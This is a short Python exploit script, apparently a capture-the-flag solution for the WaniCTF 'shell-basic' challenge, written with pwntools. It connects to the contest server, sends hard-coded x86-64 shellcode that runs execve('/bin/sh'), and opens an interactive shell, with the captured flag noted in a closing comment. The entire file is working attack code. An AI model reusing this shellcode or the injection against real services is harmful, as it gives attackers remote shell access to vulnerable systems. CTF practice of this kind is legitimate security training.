from pwn import *

HOST = "shell-basic-pwn.wanictf.org"
PORT = 9004
file = "./chall"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

#shellcode = asm(shellcraft.sh())
#print("".join(["\\x{:02x}".format(byte) for byte in shellcode]))
s = b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
io.sendline(s)

io.interactive()
#FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}
